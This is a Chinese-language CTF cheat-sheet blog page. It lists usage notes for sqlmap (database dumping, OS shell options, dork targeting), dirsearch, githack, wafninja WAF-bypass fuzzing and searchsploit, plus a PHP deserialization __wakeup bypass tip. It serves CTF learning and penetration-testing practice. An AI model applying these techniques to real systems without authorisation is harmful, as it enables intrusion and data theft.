<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>CTF速查 | Hustler&#39;s Blog</title>
  <meta name="author" content="Hustler">
  
  <meta name="description" content="Everybody needs love,but hacker dont">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="CTF速查"/>
  <meta property="og:site_name" content="Hustler&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>





<meta name="generator" content="Hexo 7.1.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/archives" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> CTF速查</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	
	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><a href="#%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99">工具网站</a><br><a href="#%E5%AD%97%E5%85%B8">字典</a><br><a href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7">常用工具</a><br>    <a href="##sqlmap">sqlmap</a><br>    <a href="##dirsearch">dirsearch</a><br>    <a href="##githack">githack</a><br>    <a href="##wafninja">wafninja</a><br>    <a href="##searchsploit">searchsploit</a><br>    <a href="##tplmap">tplmap</a><br><a href="#%E5%B8%B8%E8%A7%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6">常见备份文件</a><br><a href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">万能密码</a><br><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%A4%A7%E5%85%A8">一句话大全</a><br><a href="#%E7%AE%80%E6%98%93%E5%9B%BE%E7%89%87%E9%A9%AC">简易图片马</a><br><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF">文件上传</a><br><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a><br><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议</a></p>
<h1 id="反序列化-魔法函数-perg-match-绕过"><a href="#反序列化-魔法函数-perg-match-绕过" class="headerlink" title="反序列化 魔法函数 perg_match 绕过"></a>反序列化 魔法函数 perg_match 绕过</h1><p>反序列化的私有属性要在类名前后加%00，protected在变量名前添加标记\00<em>\00（%00</em>%00），然后urldecode后使用unserialize反序列化，最后使用var_dump输出<br>preg：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42789937/article/details/128667822">https://blog.csdn.net/weixin_42789937/article/details/128667822</a><br>魔法函数以及反序列化：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Reme_mber/article/details/124752229">https://blog.csdn.net/Reme_mber/article/details/124752229</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a><br>hustler0000.github.io<br>_wakeup可以通过改变O：后面的数字，使其与真实数量不符即可绕过</p>
<h1 id="工具网站"><a href="#工具网站" class="headerlink" title="工具网站"></a>工具网站</h1><p>ctf清单：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>在线ai1：<a target="_blank" rel="noopener" href="https://my.aigcplus.io/home">https://my.aigcplus.io/home</a><br>文心一言：<a target="_blank" rel="noopener" href="https://yiyan.baidu.com/welcome">https://yiyan.baidu.com/welcome</a><br>在线ai2：<a target="_blank" rel="noopener" href="https://c.binjie.fun/#/chat/1697008440757">https://c.binjie.fun/#/chat/1697008440757</a><br>在线工具：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a><br>在线代码执行：<a target="_blank" rel="noopener" href="https://code.y444.cn/php">https://code.y444.cn/php</a><br>在线md5：<a target="_blank" rel="noopener" href="https://cmd5.com/">https://cmd5.com/</a><br>在线反编译pyc：<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br>词频统计：<a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a></p>
<hr>
<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p><a target="_blank" rel="noopener" href="https://gitee.com/adminssssss/infiltration-dictionary">https://gitee.com/adminssssss/infiltration-dictionary</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46634561/article/details/120019738">https://blog.csdn.net/qq_46634561/article/details/120019738</a></p>
<hr>
<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap简介<br>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>
<h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span> 显示基本帮助信息
<span class="token parameter variable">-hh</span> 显示高级帮助信息
<span class="token parameter variable">--version</span> 显示版本号
<span class="token parameter variable">-v</span> 详细等级（0-6 默认 <span class="token number">1</span>）
<span class="token number">0</span>：只显示python错误以及重要信息
<span class="token number">1</span>：显示信息以及警告
<span class="token number">2</span>：显示debug消息
<span class="token number">3</span>：显示注入payload
<span class="token number">4</span>：显示http请求
<span class="token number">5</span>：显示http响应头·
<span class="token number">6</span>：显示http响应内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Target："><a href="#Target：" class="headerlink" title="Target："></a>Target：</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-u</span> 指定目标url
<span class="token parameter variable">-d</span> 直接连接数据库
<span class="token parameter variable">-l</span> 从burp代理日志的解析目标
<span class="token parameter variable">-r</span> 从文件中加载http请求
<span class="token parameter variable">-g</span> 从google dork的结果作为目标url
<span class="token parameter variable">-c</span> 从INI配置文件中加载选项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-A</span> 指定user-agent头
<span class="token parameter variable">-H</span> 额外的header
<span class="token parameter variable">-method</span><span class="token operator">=</span> 指定HTTP方法（GET/POST）
<span class="token parameter variable">--data</span><span class="token operator">=</span> 通过POST提交数据 
--param-del<span class="token operator">=</span> 指定参数分隔符
<span class="token parameter variable">--cookie</span><span class="token operator">=</span> 指定cookie的值
--cookie-del<span class="token operator">=</span> 指定cookie分隔符
--drop-set-cookie 扔掉response中的set-cookie头
--random-agent 使用随机的user-agent头
<span class="token parameter variable">--host</span><span class="token operator">=</span> 设置host头 
<span class="token parameter variable">--referer</span><span class="token operator">=</span> 指定referer头
<span class="token parameter variable">--headers</span><span class="token operator">=</span> 额外的headers
--auth-type<span class="token operator">=</span> http认证类型（Basic，NTLM，Digest）
--auith-cred<span class="token operator">=</span> http认证凭证（账号：密码）
--ignore-proxy 忽略系统代理（常用于扫描本地文件）
<span class="token parameter variable">--proxy</span><span class="token operator">=</span> 使用代理
--proxy-cred<span class="token operator">=</span> 代理认证证书（账号：密码）
<span class="token parameter variable">--delay</span><span class="token operator">=</span> 设置延迟时间（两个请求之间）
<span class="token parameter variable">--timeout</span><span class="token operator">=</span> 超时时来连接前等待（默认 <span class="token number">30</span>）
<span class="token parameter variable">--retries</span><span class="token operator">=</span> 连接超时时重试次数（默认 <span class="token number">3</span>）
<span class="token parameter variable">--randomize</span><span class="token operator">=</span> 随机更改指定的参数的值
--safe-url<span class="token operator">=</span> 在测试期间经常访问的URL
--safe-post<span class="token operator">=</span> POST数据发送到安全的URL
--safe-freq<span class="token operator">=</span> 两次请求之间穿插一个安全的URL 
--skip-urlencode 跳过payload数据的URL编码
<span class="token parameter variable">--chunked</span> 使用HTTP分块传输加密POST请求
<span class="token parameter variable">--hpp</span> 使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）
--force-ssl 强制使用SSL/HTTPS
<span class="token parameter variable">--eval</span><span class="token operator">=</span>value 请求之前提供Python代码（eg：<span class="token string">"import hashlib;id2=hashlib.md5(id).hexdigest()"</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-o</span> 打开所有优化开关
--predict-output 预测输出（与--threads不兼容）
--keep-alive 建立长久的HTTP<span class="token punctuation">(</span>S<span class="token punctuation">)</span>连接 <span class="token punctuation">(</span>与--proxy不兼容<span class="token punctuation">)</span>
--null-connection 空连接
<span class="token parameter variable">--threads</span><span class="token operator">=</span>value 设置线程<span class="token punctuation">(</span>默认 <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-p</span> 指定测试参数
<span class="token parameter variable">--skip</span><span class="token operator">=</span> 跳过指定参数的测试
--skip-static 跳过测试静态的参数
<span class="token parameter variable">--dbms</span><span class="token operator">=</span> 指定具体DBMS
<span class="token parameter variable">--os</span><span class="token operator">=</span> 指定DBMS操作系统
--invalid-bignum 使用大数字使值无效
--invalid-logical 使用逻辑符使值无效
--invalid-string 使用字符串使值无效
--no-cast 关闭payload铸造机制
--no-escape 关闭字符转义机制（默认自动开启）
<span class="token parameter variable">--prefix</span><span class="token operator">=</span> 加入payload前缀
<span class="token parameter variable">--suffix</span><span class="token operator">=</span> 加入payload后缀
<span class="token parameter variable">--tamper</span><span class="token operator">=</span> 指定使用的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Detectiong"><a href="#Detectiong" class="headerlink" title="Detectiong"></a>Detectiong</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">--level</span><span class="token operator">=</span> 指定测试的等级（1-5 默认为1）
<span class="token parameter variable">--risk</span><span class="token operator">=</span> 指定测试的风险（0-3 默认为1）
<span class="token parameter variable">--string</span><span class="token operator">=</span> 登录成功时，页面所含有的“关键字” 用于证明已经登录成功
--not-string<span class="token operator">=</span> 登录成功时，页面所含有的“关键字” 用于证明已经登录失败
<span class="token parameter variable">--code</span><span class="token operator">=</span> 查询为真时，匹配的HTTP代码
<span class="token parameter variable">--smart</span> 当有大量检测目标时，只选择基于错误的检测结果
--text-only 仅基于文本内容比较网页
<span class="token parameter variable">--titles</span> 仅基于标题比较网页<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">--technique</span><span class="token operator">=</span> 指定sql注入技术（默认BEUSTQ）
--time-sec<span class="token operator">=</span> 基于时间注入检测相应的延迟时间（默认为5秒）
--union-clos<span class="token operator">=</span> 进行查询时，指定列的范围
--union-char<span class="token operator">=</span> 指定暴力破解列数的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h3><p>-f 查询目标DBMS版本指纹信息</p>
<h3 id="Emuneration"><a href="#Emuneration" class="headerlink" title="Emuneration"></a>Emuneration</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-a</span> 查询所有 
<span class="token parameter variable">-b</span> 查询目标DBMS banner信息
--current-user 查询目标DBMS当前用户
--current-db 查询目标DBMS当前数据库
--is-dba 查询目标DBMS当前用户是否为DBA
<span class="token parameter variable">--users</span> 枚举目标DBMS所有的用户
<span class="token parameter variable">--paswords</span> 枚举目标DBMS用户密码哈希值
<span class="token parameter variable">--privileges</span> 枚举目标DBMS用户的权限
<span class="token parameter variable">--roles</span> 枚举DBMS用户的角色
<span class="token parameter variable">--dbs</span> 枚举DBMS所有的数据库
<span class="token parameter variable">--tables</span> 枚举DBMS数据库中所有的表
<span class="token parameter variable">--columns</span> 枚举DBMS数据库表中所有的列
<span class="token parameter variable">--count</span> 检索表的条目的数量
<span class="token parameter variable">--dump</span> 存储DBMS数据库的表中的条目
--dump-all 存储DBMS所有数据库表中的条目
<span class="token parameter variable">--D</span> db 指定进行枚举的数据库名称
<span class="token parameter variable">--T</span> table 指定进行枚举的数据库表名称
<span class="token parameter variable">--C</span> <span class="token function">column</span> 指定进行枚举的数据库列名称
--exclude-sysdbs 枚举表时排除系统数据库
--sql-query 指定查询的sql语句
--sql-shell 提示输入一个交互式sql shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--common-tables 暴力破解表 
--common-colomns 暴力破解列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="File-system-access"><a href="#File-system-access" class="headerlink" title="File system access"></a>File system access</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">--file-read 从目标数据库管理文件系统读取文件
--file-write 上传文件到目标数据库管理文件系统
--file-dest 指定写入文件的绝对路径
--os-cmd<span class="token operator">=</span> 执行操作系统命令
--os-shell 交互式的系统shell
--os-pwn 获取一个OOB shell，Meterpreter或者VNC
--os-smbrelay 一键 获取一个OOB shell，Meterpreter或者VNC
--os-bof 储存过程缓冲区溢出利用
--os-esc 数据库进程用户权限提升
--msf-path<span class="token operator">=</span> Metasploit Framework本地安装路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="General"><a href="#General" class="headerlink" title="General"></a>General</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-s</span> sqlite会话文件保存位置
<span class="token parameter variable">-t</span> 记录所有HTTP流量到指定文件中
<span class="token parameter variable">--batch</span> 测试过程中， 执行所有默认配置
<span class="token parameter variable">--charset</span><span class="token operator">=</span>v 强制用于数据检索的字符编码 
<span class="token parameter variable">--crawl</span><span class="token operator">=</span> 从目标URL开始爬取网站
--crawl-exclude<span class="token operator">=</span> 禁止爬取某个页面（eg：logout）
--csv-del<span class="token operator">=</span> 指定CSV输出中使用的的字符
--dump-format<span class="token operator">=</span> 储存数据的方式（CSV<span class="token punctuation">(</span>default<span class="token punctuation">)</span>，HTML，SQLITE）
--flush-session 刷新当前目标的会话文件
--fresh-queries 忽略会话文件中储存的查询结果，重新查询
<span class="token parameter variable">--hex</span> 使用DBMS hex函数进行数据检索
--outpout-dir<span class="token operator">=</span> 自定义输出目录
<span class="token parameter variable">--save</span><span class="token operator">=</span> 保存选项到INI配置文件中
<span class="token parameter variable">--scope</span><span class="token operator">=</span> 使用正则表达式从提供的日志中guo'l
<span class="token parameter variable">--alert</span> 再找到SQL注入时运行主机操作系统命令
--purge-output 安全的从输出目录中删除所有内容
--sqlmap-shell 提示输入交互式sqlmap shell
<span class="token parameter variable">--update</span> 更新sqlmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">--technique</span><span class="token operator">=</span> （默认全部使用）
B 基于布尔的盲注
T 基于时间的盲注
E 基于报错的注入
U 基于UNION查询注入
S 基于多语句查询注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="sqlmap获取目标方式"><a href="#sqlmap获取目标方式" class="headerlink" title="sqlmap获取目标方式"></a>sqlmap获取目标方式</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.指定目标url
sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1"</span>
<span class="token number">2</span>.从文件中获取多个url
sqlmap <span class="token parameter variable">-m</span> <span class="token number">1</span>.txt
<span class="token number">3</span>.从文件中加载HTTP请求
sqlmap <span class="token parameter variable">-r</span> url.txt
<span class="token number">4</span>.利用google获取目标
sqlmap <span class="token parameter variable">-g</span> <span class="token string">"inurl:<span class="token entity" title="\&quot;">\"</span>.php?id=1<span class="token entity" title="\&quot;">\"</span>"</span>
<span class="token number">5</span>.从burp日志中获取目标
sqlmap <span class="token parameter variable">-l</span> burp.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> &#x2F;&#x2F;日常使用<br>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -r &#x2F;&#x2F;递归扫描，不过容易被检测<br>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -r -t 30 &#x2F;&#x2F;线程控制请求速率<br>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -r -t 30 –proxy 127.0.0.1:8080 &#x2F;&#x2F;使用代理 </p>
<h3 id="安装及简单使用"><a href="#安装及简单使用" class="headerlink" title="安装及简单使用"></a>安装及简单使用</h3><p>pip3 install -r requirements.txt # 安装下需要的依赖<br>python3 dirsearch.py -u [target_url] # 攻击目标url地址，可以用 -u 参数指定多个</p>
<h3 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h3><p>这个脚本很多功能参数，但能用到的可能比较少，几乎都有默认配置，在 default.conf 中可以看到</p>
<h3 id="版本以及帮助命令"><a href="#版本以及帮助命令" class="headerlink" title="版本以及帮助命令"></a>版本以及帮助命令</h3><p>–version 显示程序版本号并退出<br>-h 显示帮助信息并退出</p>
<h3 id="常用命令参数"><a href="#常用命令参数" class="headerlink" title="常用命令参数"></a>常用命令参数</h3><p>-u 攻击目标url地址，可以指定多个，通过逗号分隔<br>-l url列表文件，比如你可以建一个 targets.txt，里面包含需要攻击的网址<br>-e 站点文件类型列表，如：php,asp，有默认配置：php,aspx,jsp,html,js，基本主流的格式都包含了<br>-X 不需要扫描的站点文件类型列表<br>-w 用指定爆破字典执行，若存在多个通过逗号分隔<br>-t 指定线程数<br>-i 仅现实指定的状态码，指定多个通过逗号分隔<br>-x 不显示指定的状态码，指定多个通过逗号分隔<br>–exclude-sizes&#x3D;SIZES 不显示的响应包大小（Example: 123B,4KB）<br>–exclude-texts&#x3D;TEXTS 不显示的响应包关键字 (Example: “Not found”, “Error”）<br>-m 指定请求方式，默认GET</p>
<h3 id="较为冷门配置"><a href="#较为冷门配置" class="headerlink" title="较为冷门配置"></a>较为冷门配置</h3><p>–cidr&#x3D;CIDR 无类域间路由CIDR<br>–prefixes&#x3D;PREFIXES 对字典中的每个项添加自定义前缀，比如字典中有个项是app，只要我指定 ~,+,&#x3D;，那么就会爆破的字典项为 ~app、+app、&#x3D;app，若存在多个通过逗号分隔<br>–suffixes&#x3D;SUFFIXES 添加自定义后缀，同上若存在多个通过逗号分隔<br>-U 字典全部大写<br>-L 字典全部小写<br>-C 首字母大写<br>-d 指定HTTP request data<br>-H 设置HTTP请求头，Example: -H “Referer: example.com” -H “Accept: <em>&#x2F;</em>“<br>–random-user-agent&#x3D;true&#x2F;false 随机user-agent开关<br>–user-agent&#x3D;USERAGENT 自定义用户凭证，比如 Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko&#x2F;20100101 Firefox&#x2F;97.0，可以伪造请求报文<br>–cookie&#x3D;COOKIE 可以设置访问cookie<br>–exit-on-error 当出错直接关闭程序<br>–timeout&#x3D;TIMEOUT 访问超时设置<br>-s DELAY, –delay&#x3D;DELAY 请求间隔延迟&#x2F;s，支持浮点数 Delay between requests (support float number)<br>–proxy&#x3D;PROXY 指定访问代理，例如: localhost:8080, socks5:&#x2F;&#x2F;localhost:8088)</p>
<h3 id="输出报告格式"><a href="#输出报告格式" class="headerlink" title="输出报告格式"></a>输出报告格式</h3><p>–simple-report&#x3D;OUTPUTFILE 简洁报告<br>–plain-text-report&#x3D;OUTPUTFILE 纯文本格式报告<br>–json-report&#x3D;OUTPUTFILE json格式报告<br>–xml-report&#x3D;OUTPUTFILE xml格式报告<br>–markdown-report&#x3D;OUTPUTFILE markdown格式报告</p>
<h2 id="githack"><a href="#githack" class="headerlink" title="githack"></a>githack</h2><p>python2 githack.py  <a href="https://example.com/.git/">https://example.com/.git/</a></p>
<h2 id="wafninja"><a href="#wafninja" class="headerlink" title="wafninja"></a>wafninja</h2><p>基于python2<br>python wafninja.py fuzz -h # 我们可以把fuzz 换成 bypass,insert-fuzz,insert-bypass,set-db 这几个关键词，便可以查看相对应的帮助信息。</p>
<h3 id="Fuzz是什么？"><a href="#Fuzz是什么？" class="headerlink" title="Fuzz是什么？"></a>Fuzz是什么？</h3><p>Generally speaking fuzz is a brute force method which used to break software，就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方。<br>bypass就是绕过。</p>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><p>fuzz（模糊测试）:<br>python wafninja.py fuzz -u “<a target="_blank" rel="noopener" href="http://www.target.com/index.php?id=FUZZ%E2%80%9C">http://www.target.com/index.php?id=FUZZ“</a> -c “phpsessid&#x3D;value” -t xss -o output.html<br>bypass（绕过WAF）:python wafninja.py bypass -u “<a target="_blank" rel="noopener" href="http://www.target.com/index.php%E2%80%9C">http://www.target.com/index.php“</a> -p “Name&#x3D;PAYLOAD&amp;Submit&#x3D;Submit” -c “phpsessid&#x3D;value” -t xss -o output.html<br>insert-fuzz（用户自定义模糊测试载荷）:python wafninja.py insert-fuzz -i select -e select -t sql</p>
<h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><p>其他参数：{fuzz,bypass,insert-fuzz,insert-bypass,set-db}fuzz 检查WAF允许通过的符号和关键词。.bypass 从数据库中发送载荷到目标。insert-fuzz 添加一个模糊字符串。insert-bypass 添加一个载荷到绕过列表。set-db 设置另外一个数据库文件。对于别人分享的相同载荷数据库时，这个特别有用。<br>可选参数：-h, —help 显示帮助信息并且退出。-u URL 目标URL（例如： “<a target="_blank" rel="noopener" href="http://www.target.com/index.php?id=FUZZ%E2%80%9D)%E6%B3%A8%E6%84%8F%EF%BC%9A%E7%94%A8%E5%85%B3%E9%94%AE%E8%AF%8DFUZZ%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82-p">www.target.com/index.php?id=FUZZ”)注意：用关键词FUZZ来指定模糊测试的位置。-p</a> POST PARAMETER 通过post参数发送模糊测试载荷 Send fuzz through post parameter-c COOKIE HTTP Cookie 头部-t TYPE 载荷的类型 [sql|xss]-d DELAY 每个请求的等待时间。默认是0秒-o OUTPUT FILE 保存输出到html 文件—proxy PROXY 使用代理；Use a proxy. Format: IP:PORT—prefix PROXY 增加前缀；Add a prefix to every fuzz.—postfix PROXY 增加postfix；Add a postfix to every fuzz.-w WAF 发送特定WAF的有效载荷；Send payloads of certain WAF [default&#x3D;generic]-e EXPECTED 目标站点的预期输出。如果输入是编码的或类似的，请使用此选项。-p PATH sqlite数据库的路径。默认位置为“db&#x2F;db.sqlite”</p>
<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a></p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Usage: searchsploit [options] term1 [term2] … [termN]</p>
<h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><p>searchsploit afd windows local<br>searchsploit -t oracle windows<br>searchsploit -p 39446<br>searchsploit linux kernel 3.2 –exclude&#x3D;”(PoC)|&#x2F;dos&#x2F;“<br>For more examples, see the manual: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/searchsploit/">https://www.exploit-db.com/searchsploit/</a></p>
<h4 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h4><p>-c, –case [Term] 区分大小写(默认不区分大小写)<br>-e, –exact [Term] 对exploit标题进行EXACT匹配 (默认为 AND) [Implies “-t”].<br>-h, –help 显示帮助<br>-j, –json [Term] 以JSON格式显示结果<br>-m, –mirror [EDB-ID] 把一个exp拷贝到当前工作目录,参数后加目标id<br>-o, –overflow [Term] Exploit标题被允许溢出其列<br>-p, –path [EDB-ID] 显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>-t, –title [Term] 仅仅搜索漏洞标题（默认是标题和文件的路径）<br>-u, –update 检查并安装任何exploitdb软件包更新（deb或git）<br>-w, –www [Term] 显示Exploit-DB.com的URL而不是本地路径（在线搜索）<br>-x, –examine [EDB-ID] 使用$ PAGER检查（副本）Exp<br>–colour 搜索结果不高亮显示关键词<br>–id 显示EDB-ID<br>–nmap [file.xml] 使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>使用“-v”（详细）来尝试更多的组合<br>–exclude&#x3D;”term” 从结果中删除值。通过使用“|”分隔多个值<br>例如–exclude&#x3D;“term1 | term2 | term3”。</p>
<h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><ul>
<li>你可以使用任意数量的搜索词。</li>
<li>Search terms are not case-sensitive (by default), and ordering is irrelevant.</li>
<li>搜索术语不区分大小写(默认情况下)，而排序则无关紧要。</li>
<li>如果你想用精确的匹配来过滤结果，请使用用 -e 参数</li>
<li>使用’ - t ‘将文件的路径排除，以过滤搜索结果</li>
<li>删除误报(特别是在搜索使用数字时 - i.e. 版本).</li>
<li>当更新或显示帮助时，搜索项将被忽略。<br>searchsploit [options] term1 [term2] … [termN]<br>searchsploit [选项] 关键字1 [关键字2] … [关键字N]</li>
</ul>
